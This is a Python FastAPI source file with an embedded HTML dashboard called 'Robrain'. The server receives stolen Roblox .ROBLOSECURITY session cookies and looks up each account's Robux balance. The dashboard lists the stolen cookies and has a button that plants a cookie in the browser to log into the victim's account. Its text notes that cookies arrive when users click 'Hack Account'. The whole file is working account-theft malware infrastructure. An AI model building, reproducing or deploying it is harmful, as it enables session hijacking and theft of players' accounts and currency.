from fastapi import FastAPI, Request, HTTPException, Depends
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from pydantic import BaseModel
import json, secrets, hashlib, os, httpx
from datetime import datetime, timedelta

app = FastAPI()

DATA_FILE = "data.json"
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
SESSIONS = {}

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE) as f: return json.load(f)
    return {"cookies": [], "settings": {"theme": "purple", "username": "Admin"}}

def save_data(d):
    with open(DATA_FILE, "w") as f: json.dump(d, f, indent=2, ensure_ascii=False)

data = load_data()

class CookieData(BaseModel):
    cookie: str; username: str; browser: str = "Chrome"; timestamp: str = ""

async def get_robux(cookie: str) -> int:
    try:
        async with httpx.AsyncClient() as client:
            r = await client.get("https://users.roblox.com/v1/users/authenticated",
                headers={"Cookie": f".ROBLOSECURITY={cookie}"}, timeout=10)
            if r.status_code != 200: return 0
            uid = r.json().get("id")
            r2 = await client.get(f"https://economy.roblox.com/v1/users/{uid}/currency",
                headers={"Cookie": f".ROBLOSECURITY={cookie}"}, timeout=10)
            return r2.json().get("robux", 0) if r2.status_code == 200 else 0
    except: return 0

def require_session(request: Request):
    token = request.cookies.get("session")
    if not token or token not in SESSIONS: raise HTTPException(401, "Unauthorized")
    return SESSIONS[token]

@app.get("/api/check-auth")
async def check_auth(request: Request):
    try:
        require_session(request)
        return {"authenticated": True, **data["settings"]}
    except: return JSONResponse({"authenticated": False}, status_code=401)

@app.post("/api/login")
async def login(request: Request):
    body = await request.json()
    if body.get("password") == ADMIN_PASSWORD:
        token = secrets.token_hex(32)
        SESSIONS[token] = {"username": data["settings"].get("username", "Admin")}
        resp = JSONResponse({"ok": True})
        resp.set_cookie("session", token, httponly=True, samesite="strict", max_age=86400*7)
        return resp
    raise HTTPException(403, "Wrong password")

@app.post("/api/logout")
async def logout(request: Request):
    token = request.cookies.get("session")
    if token: SESSIONS.pop(token, None)
    resp = JSONResponse({"ok": True})
    resp.delete_cookie("session")
    return resp

@app.post("/api/cookie")
async def receive_cookie(c: CookieData):
    robux = await get_robux(c.cookie)
    entry = {
        "time": c.timestamp or datetime.utcnow().isoformat(),
        "username": c.username, "cookie": c.cookie,
        "browser": c.browser, "robux": robux,
    }
    data["cookies"].append(entry)
    save_data(data)
    return {"status": "ok", "total": len(data["cookies"]), "robux": robux}

@app.get("/api/cookies")
async def get_cookies(session=Depends(require_session)):
    return data["cookies"][-50:]

@app.post("/api/settings")
async def update_settings(request: Request, session=Depends(require_session)):
    body = await request.json()
    data["settings"].update(body)
    save_data(data)
    return {"ok": True}

@app.delete("/api/cookies/{idx}")
async def delete_cookie(idx: int, session=Depends(require_session)):
    if 0 <= idx < len(data["cookies"]):
        data["cookies"].pop(idx)
        save_data(data)
    return {"ok": True}

# ─── Frontend ───

HTML = """
<!DOCTYPE html>
<html lang="ru" data-theme="purple">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Robrain Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;min-height:100vh;background:var(--bg);color:var(--text);transition:.3s}

/* ─── THEMES ─── */
:root,[data-theme="purple"]{--bg:#0d0618;--card:#1a0d2e;--border:#2d1560;--accent:#b47bff;--accent2:#c9a0ff;--text:#e6edf3;--text2:#8a82a0;--glow:0 0 20px rgba(180,123,255,.3);--glow2:0 0 40px rgba(180,123,255,.15);--btn-bg:#2d1560;--btn-hover:#3d2080;--danger:#ff5c6e;--success:#3dd68c}
[data-theme="blue"]{--bg:#0a0e1a;--card:#0f1a30;--border:#1a3055;--accent:#4da6ff;--accent2:#80bfff;--glow:0 0 20px rgba(77,166,255,.3);--glow2:0 0 40px rgba(77,166,255,.15);--btn-bg:#1a3055;--btn-hover:#264575}
[data-theme="red"]{--bg:#1a0a0a;--card:#2e0f0f;--border:#551a1a;--accent:#ff4d4d;--accent2:#ff8080;--glow:0 0 20px rgba(255,77,77,.3);--glow2:0 0 40px rgba(255,77,77,.15);--btn-bg:#551a1a;--btn-hover:#752525}
[data-theme="green"]{--bg:#0a1a0a;--card:#0f2e0f;--border:#1a551a;--accent:#4dff4d;--accent2:#80ff80;--glow:0 0 20px rgba(77,255,77,.3);--glow2:0 0 40px rgba(77,255,77,.15);--btn-bg:#1a551a;--btn-hover:#257525}
[data-theme="crimson"]{--bg:#0d0608;--card:#2e0d14;--border:#551525;--accent:#dc143c;--accent2:#ff4d6d;--glow:0 0 20px rgba(220,20,60,.3);--glow2:0 0 40px rgba(220,20,60,.15);--btn-bg:#551525;--btn-hover:#752035}
[data-theme="gold"]{--bg:#0d0b04;--card:#2e2408;--border:#553d0a;--accent:#ffd700;--accent2:#ffe44d;--glow:0 0 20px rgba(255,215,0,.3);--glow2:0 0 40px rgba(255,215,0,.15);--btn-bg:#553d0a;--btn-hover:#755010}

.container{max-width:1200px;margin:0 auto;padding:30px 20px}

/* ─── LOGIN ─── */
.login-page{display:flex;align-items:center;justify-content:center;min-height:100vh}
.login-box{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:50px 40px;width:380px;box-shadow:var(--glow2);text-align:center}
.login-box h1{font-size:24px;margin-bottom:8px;color:var(--accent)}
.login-box p{color:var(--text2);margin-bottom:30px;font-size:14px}
.login-box input{width:100%;padding:14px 16px;background:rgba(255,255,255,.05);border:1px solid var(--border);border-radius:10px;color:var(--text);font-size:15px;outline:none;transition:.2s;margin-bottom:16px}
.login-box input:focus{border-color:var(--accent);box-shadow:var(--glow)}

/* ─── HEADER ─── */
.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px;padding-bottom:20px;border-bottom:1px solid var(--border)}
.header h1{font-size:22px;color:var(--accent);text-shadow:0 0 20px rgba(180,123,255,.4)}
.header-actions{display:flex;gap:10px;align-items:center}
.header-actions span{color:var(--text2);font-size:14px}

.theme-dots{display:flex;gap:6px}
.theme-dot{width:28px;height:28px;border-radius:50%;border:2px solid transparent;cursor:pointer;transition:.2s}
.theme-dot:hover{transform:scale(1.15)}
.theme-dot.active{border-color:var(--text);box-shadow:0 0 10px rgba(255,255,255,.2)}
.theme-dot.purple{background:#b47bff}
.theme-dot.blue{background:#4da6ff}
.theme-dot.red{background:#ff4d4d}
.theme-dot.green{background:#4dff4d}
.theme-dot.crimson{background:#dc143c}
.theme-dot.gold{background:#ffd700}

/* ─── BUTTONS ─── */
.btn{padding:10px 20px;border:none;border-radius:10px;cursor:pointer;font-size:13px;font-weight:600;transition:.2s;display:inline-flex;align-items:center;gap:6px}
.btn-primary{background:var(--accent);color:var(--bg)}
.btn-primary:hover{box-shadow:var(--glow);transform:translateY(-1px)}
.btn-outline{background:transparent;border:1px solid var(--border);color:var(--text)}
.btn-outline:hover{border-color:var(--accent);color:var(--accent)}
.btn-danger{background:var(--danger);color:#fff}
.btn-danger:hover{opacity:.85}
.btn-sm{padding:7px 14px;font-size:12px}

/* ─── CARDS ─── */
.cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px}

.card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:20px;transition:.3s;position:relative;overflow:hidden}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--accent);opacity:0;transition:.3s}
.card:hover::before{opacity:1}
.card:hover{border-color:var(--accent);box-shadow:var(--glow);transform:translateY(-2px)}

.card-top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
.card-name{font-size:16px;font-weight:700}
.card-time{font-size:11px;color:var(--text2)}
.card-cookie{font-size:11px;color:var(--text2);word-break:break-all;margin-bottom:12px;padding:8px 10px;background:rgba(0,0,0,.3);border-radius:8px;font-family:monospace;max-height:50px;overflow:hidden}
.card-cookie:hover{max-height:200px}
.card-bottom{display:flex;justify-content:space-between;align-items:center;gap:8px}
.robux-badge{background:rgba(255,215,0,.15);color:#ffd700;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:700;border:1px solid rgba(255,215,0,.3)}

/* ─── SETTINGS MODAL ─── */
.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.7);z-index:100;align-items:center;justify-content:center}
.modal-overlay.open{display:flex}
.modal{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:30px;width:420px;max-width:90vw}
.modal h2{margin-bottom:20px;color:var(--accent)}
.modal label{display:block;font-size:13px;color:var(--text2);margin-bottom:6px;margin-top:14px}
.modal input{width:100%;padding:12px 14px;background:rgba(255,255,255,.05);border:1px solid var(--border);border-radius:10px;color:var(--text);font-size:14px;outline:none}
.modal input:focus{border-color:var(--accent)}
.modal-actions{display:flex;gap:10px;margin-top:20px;justify-content:flex-end}

.empty{text-align:center;color:var(--text2);padding:60px 20px;font-size:15px}
.empty h2{color:var(--accent);margin-bottom:8px}

.logout-btn{background:none;border:1px solid var(--danger);color:var(--danger);padding:8px 16px;border-radius:8px;cursor:pointer;font-size:12px;transition:.2s}
.logout-btn:hover{background:var(--danger);color:#fff}
</style>
</head>
<body>
<div id="app"></div>

<script>
const app = document.getElementById('app');
let state = { authenticated: false, cookies: [], settings: {}, theme: 'purple' };

async function api(method, path, body) {
    const opts = { method, headers: {} };
    if (body) { opts.headers['Content-Type'] = 'application/json'; opts.body = JSON.stringify(body); }
    const r = await fetch(path, opts);
    if (r.status === 401) { state.authenticated = false; render(); return null; }
    return r.json();
}

async function init() {
    const auth = await api('GET', '/api/check-auth');
    if (auth && auth.authenticated) {
        state.authenticated = true;
        state.settings = auth;
        state.theme = auth.theme || 'purple';
        document.documentElement.setAttribute('data-theme', state.theme);
        const c = await api('GET', '/api/cookies');
        if (c) state.cookies = c;
    }
    render();
}

function render() {
    if (!state.authenticated) { renderLogin(); return; }
    renderDashboard();
}

function renderLogin() {
    app.innerHTML = `
    <div class="login-page">
      <div class="login-box">
        <h1>🛡 Robrain</h1>
        <p>Enter password to access dashboard</p>
        <input type="password" id="pwd" placeholder="Password" onkeydown="if(event.key==='Enter') login()">
        <button class="btn btn-primary" style="width:100%" onclick="login()">Sign In</button>
        <div id="login-error" style="color:var(--danger);margin-top:12px;font-size:13px"></div>
      </div>
    </div>`;
}

async function login() {
    const pwd = document.getElementById('pwd').value;
    const err = document.getElementById('login-error');
    try {
        const r = await api('POST', '/api/login', { password: pwd });
        if (r && r.ok) { state.authenticated = true; init(); }
        else err.textContent = 'Wrong password';
    } catch { err.textContent = 'Login failed'; }
}

function renderDashboard() {
    app.innerHTML = `
    <div class="container">
      <div class="header">
        <h1>🛡 Robrain</h1>
        <div class="header-actions">
          <span>${state.cookies.length} accounts</span>
          <div class="theme-dots">
            <div class="theme-dot purple ${state.theme==='purple'?'active':''}" onclick="setTheme('purple')"></div>
            <div class="theme-dot blue ${state.theme==='blue'?'active':''}" onclick="setTheme('blue')"></div>
            <div class="theme-dot red ${state.theme==='red'?'active':''}" onclick="setTheme('red')"></div>
            <div class="theme-dot green ${state.theme==='green'?'active':''}" onclick="setTheme('green')"></div>
            <div class="theme-dot crimson ${state.theme==='crimson'?'active':''}" onclick="setTheme('crimson')"></div>
            <div class="theme-dot gold ${state.theme==='gold'?'active':''}" onclick="setTheme('gold')"></div>
          </div>
          <button class="btn btn-outline btn-sm" onclick="openSettings()">⚙ Settings</button>
          <button class="logout-btn" onclick="logout()">Logout</button>
        </div>
      </div>
      <div class="cards" id="cards"></div>
    </div>

    <div class="modal-overlay" id="settings-modal">
      <div class="modal">
        <h2>⚙ Settings</h2>
        <label>Display Name</label>
        <input type="text" id="set-name" value="${state.settings.username || ''}">
        <label>Theme</label>
        <div style="display:flex;gap:8px;margin-top:6px">
          ${['purple','blue','red','green','crimson','gold'].map(t =>
            `<div class="theme-dot ${t} ${state.theme===t?'active':''}" onclick="setTheme('${t}')"></div>`
          ).join('')}
        </div>
        <label>Change Password</label>
        <input type="password" id="set-pwd" placeholder="New password">
        <div class="modal-actions">
          <button class="btn btn-outline" onclick="closeSettings()">Cancel</button>
          <button class="btn btn-primary" onclick="saveSettings()">Save</button>
        </div>
      </div>
    </div>`;

    renderCards();
}

function renderCards() {
    const container = document.getElementById('cards');
    if (!state.cookies.length) {
        container.innerHTML = '<div class="empty"><h2>No accounts yet</h2><p>Cookies will appear here when users click Hack Account</p></div>';
        return;
    }
    container.innerHTML = state.cookies.map((c, i) => `
    <div class="card">
      <div class="card-top">
        <div>
          <div class="card-name">${c.username}</div>
          <div class="card-time">${new Date(c.time).toLocaleString()}</div>
        </div>
        <div class="robux-badge">💰 ${c.robux ?? '?'} R$</div>
      </div>
      <div class="card-cookie" title="Click to expand">${c.cookie}</div>
      <div class="card-bottom">
        <button class="btn btn-primary btn-sm" onclick="loginToRoblox('${c.cookie.replace(/'/g, "\\'")}')">▶ Login</button>
        <button class="btn btn-danger btn-sm" onclick="deleteCookie(${i})">✕ Delete</button>
      </div>
    </div>`).join('');
}

async function setTheme(t) {
    state.theme = t;
    document.documentElement.setAttribute('data-theme', t);
    await api('POST', '/api/settings', { theme: t });
    renderDashboard();
}

function openSettings() { document.getElementById('settings-modal').classList.add('open') }
function closeSettings() { document.getElementById('settings-modal').classList.remove('open') }

async function saveSettings() {
    const name = document.getElementById('set-name').value;
    const pwd = document.getElementById('set-pwd').value;
    const body = { username: name };
    if (pwd) body.password = pwd;
    await api('POST', '/api/settings', body);
    state.settings.username = name;
    closeSettings();
    renderDashboard();
}

function loginToRoblox(cookie) {
    document.cookie = `.ROBLOSECURITY=${cookie}; path=/; domain=.roblox.com`;
    window.open('https://www.roblox.com/home', '_blank');
}

async function deleteCookie(i) {
    await api('DELETE', `/api/cookies/${i}`);
    state.cookies.splice(i, 1);
    renderCards();
}

async function logout() {
    await api('POST', '/api/logout');
    state.authenticated = false;
    render();
}

init();
</script>
</body>
</html>
"""

@app.get("/")
async def root():
    return HTMLResponse(HTML)
